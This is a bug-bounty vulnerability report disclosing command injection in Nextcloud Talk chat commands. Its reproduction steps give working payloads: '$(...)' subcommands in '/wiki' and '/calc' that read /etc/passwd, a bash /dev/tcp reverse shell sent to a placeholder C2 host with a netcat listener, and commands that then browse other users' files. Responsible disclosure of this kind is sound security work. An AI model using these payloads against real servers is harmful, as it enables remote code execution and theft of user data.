# Code injection possible with malformed Nextcloud Talk chat commands

## Metadata

- HackerOne Report ID: 851807
- Weakness: Code Injection
- Program: nextcloud

## Original Report

## Summary
The Nextcloud Talk app allows system administrators to setup chat commands that can be executed in Talk using the "/command" syntax. Users can provide additional arguments to the commands, such as "/calc 1+1" or "/wiki Hello", which are passed to the underlying script using `@exec`. If arguments are accepted, it is possible to trigger arbitrary code by wrapping the code in bash subcommand syntax `/wiki test $(mycommand)`. This allows for arbitrary code execution, which an actor can use to spawn a reverse shell back from the remote machine.

## Severity
This bug has been filed with a severity of `Critical` inline with the bounty impact/definition chart and the Nextcloud Threat Model as the bug allows both remote code execution via a non-admin user as well as access of complete user data of any other user. 

## Affected Versions
All versions that support Talk Commands appear to be affected as the bug is in the `@execute` command. 
The following version were tested: 
- master-2020-04-15 via `snap install nextcloud --edge`, `occ.status versionstring: 19.0.0 beta 2`
- 17.0.5snap1 via `snap install nextcloud`, `occ.status versionstring: 17.0.5`

## Repro Steps
1. Install and Setup Nextcloud
   1. create Ubuntu 18.04 VM
   2. install Nextcloud Server (Nextcloud Hub snap used for this test `snap install nextcloud --edge`)
   3. run install command: `nextcloud.manual-install "admin" "password"`
   4. generate self signed certificate `nextcloud.enable-https self-signed`
   5. set trusted domains `nextcloud.occ config:system:set trusted_domains 1 --value=<domain/ip>`
   6. create user `alice`
   7. install and enable spreed/talk app
   8. enable sample talk commands `nextcloud.occ talk:command:add-samples`
   9. add calculator command as described in the [documentation here](https://nextcloud-talk.readthedocs.io/en/latest/commands/#create-pathtocalcsh)

2. Setup C2 VM
   1. kali used for this test, can be any host with netcat `nc`
   2. run nc listener `nc -l -p 8888`
3. Create Shell Script > shell.sh
   > This script can be anything that gets executed and returns a shell
   > In this case, a simple reverse shell is initiated using bash interactive piping to /dev/tcp
   > A php web shell, meterpreter binary or any other executable could be uploaded here
   ```
   bash -i >& /dev/tcp/<c2-ip-here>/8888 0>&1 &
   ```
4. Log In As Alice and Upload File
   1. upload above shell.sh to root directory of alice's Nexcloud files

5. With Alice, start a Talk Conversation

6. Test Exploitability:
    > Note, all commands appear to get successfully executed, however whether output is shown depends on the implementation of the backing script. For example, /wiki cannot show the results of `cat /etc/passwd` because the multiline output breaks the wiki script, but the [calculator sample](https://nextcloud-talk.readthedocs.io/en/latest/commands/#create-pathtocalcsh) can show the output because it has an echo command in the scrpt. 
    ```
    /wiki test $(id)
    /wiki test $(pwd)
    /wiki test $(ls -al .)
    /calc test $(cat /etc/passwd)
    /calc test $(ls -al ../)
    ```

7. Execute Reverse Shell
   1. Locate uploaded shell script 
      1. For nextcloud snap, the data directory is defined [here](https://github.com/nextcloud/nextcloud-snap#where-is-my-stuff)
      2. File locations are fixed, therefore, once the root directory is known, it is easy to derive the location of the script
      3. Can use `/calc test $(ls ../)` to explore directory structure
   2. Enable execution of the script
   3. Execute the script
    ```
    /wiki test $(chmod +x /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)
    /wiki test $(bash /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)
    ```

8. Observer C2 Listener for Connection

9. Run Commands via C2
    ```
    id 
    pwd
    cd /var/snap/nextcloud/common/nextcloud/data/admin/files
    ls -al
    occ status
    ```

See attached screenshots

## Impact

- Complete access to all user files
- Shell access to occ
- Shell access to host machine - root access if Nextcloud is running as root
